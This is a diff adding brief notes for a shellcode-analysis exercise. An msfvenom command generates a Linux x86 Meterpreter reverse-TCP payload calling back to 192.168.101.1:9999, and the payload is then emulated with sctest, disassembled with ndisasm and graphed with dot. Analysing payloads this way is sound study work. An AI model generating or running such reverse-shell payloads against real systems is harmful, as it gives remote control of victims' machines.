@@ -1,0 +1,16 @@
+
+
+met_rev
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp port=9999 rhost=192.168.101.1 \ -a x86 --platform=linux -f raw -o linux-x86-met_rev.msf
+
+sctest -vvv -Ss 10000 -G linux-x86-met_rev.dot < linux-x86-met_rev.msf
+
+ndisasm -u ./linux-x86-met_rev.msf
+
+dot linux-x86-met_rev.dot -T png > linux-x86-met_rev.png
+
+
+
+
+
